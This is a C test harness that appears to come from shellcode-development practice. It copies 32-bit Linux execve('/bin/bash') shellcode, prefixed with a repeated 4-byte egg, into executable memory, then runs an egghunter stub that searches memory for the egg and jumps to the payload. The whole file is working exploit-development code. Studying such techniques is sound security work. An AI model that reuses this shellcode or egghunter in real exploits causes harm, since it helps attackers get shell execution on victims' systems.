#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <errno.h>

// Egg has to be 4 bytes and seperate from the shellcode to avoid the egghunter from finding the buffer defined here (on the stack)
// instead of the executable one that is created later on in the program.

char egg[] = "\x40\x56\xa2\xaa";
char shellcode[] = "\x31\xc0\xb0\x68\x50\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
char egghunter[] = "\x31\xc9\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x40\x56\xa2\xaa\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

void main()
{
	char *buf;
	char *buf2;

	int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
	int flags = MAP_PRIVATE | MAP_ANONYMOUS;

	// ---
	
	printf("[*] Creating executable buf (for shellcode)...\n");
	buf = mmap(0, sizeof(shellcode + 8), prot, flags, -1, 0);
	
	printf("[*] Copying shellcode into buf (8 + %d bytes)...\n", strlen(shellcode)-8);
	memcpy(buf, egg, 4);
	memcpy(buf+4, egg, 4);
	memcpy(buf+8, shellcode, sizeof(shellcode));
	
	// ---
	
	printf("[*] Creating executable buf2 (for egghunter)...\n");
	buf2 = mmap(0, sizeof(egghunter), prot, flags, -1, 0);
	
	printf("[*] Copying egghunter into buf2 (%d bytes)...\n", strlen(egghunter));
	memcpy(buf2, egghunter, sizeof(egghunter));

	// ---

	printf("[*] Shellcode is located at %p\n", buf);
	printf("[*] Egghunter is located at %p\n", buf2);

	// ---

	printf("[*] Running egghunter...\n");
	((void (*)(void))buf2)();    
}

